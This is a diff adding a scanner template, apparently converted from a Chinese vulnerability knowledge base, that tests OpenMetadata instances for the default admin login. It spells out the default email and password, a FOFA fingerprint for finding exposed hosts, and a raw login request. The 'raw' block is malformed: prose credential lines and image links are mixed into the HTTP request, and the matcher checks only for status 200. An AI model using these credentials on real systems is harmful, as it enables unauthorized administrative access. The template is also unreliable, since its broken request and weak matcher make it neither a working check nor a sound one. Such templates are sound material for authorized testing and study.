@@ -1,0 +1,47 @@
+id: poc-wxh28oseu1n8g1d2
+info:
+  name: OpenMetadata-默认口令登录漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wxh28oseu1n8g1d2'
+  tags: default-login,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wxh28oseu1n8g1d2
+    fofa: icon_hash="733091897"
+http:
+- raw:
+  - '默认账号：[admin@open-metadata.org](mailto:admin@open-metadata.org)
+
+    默认密码：admin
+
+    POST /api/v1/users/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Accept: application/json, text/plain, */*
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
+
+    Content-Type: application/json
+
+    Cookie: i18next=zh-CN; redirectUrlPath=%2Fexplore; __session=%7B%22id%22%3A%2200611e0a-b368-4e82-a04d-15221dc1084a%22%2C%22created%22%3A1756178869912%2C%22createdAt%22%3A%222025-08-26T03%3A27%3A49.912Z%22%2C%22expires%22%3A1756180669912%2C%22expiresAt%22%3A%222025-08-26T03%3A57%3A49.912Z%22%7D
+
+    Content-Length: 57
+
+
+    {"email":"admin@open-metadata.org","password":"YWRtaW4="}
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547167565-de42f3ca-df56-4fcd-9d62-ef2b637d47ff.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547167773-47a7679f-ea2c-4bb7-b58c-3d76fcd419a4.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
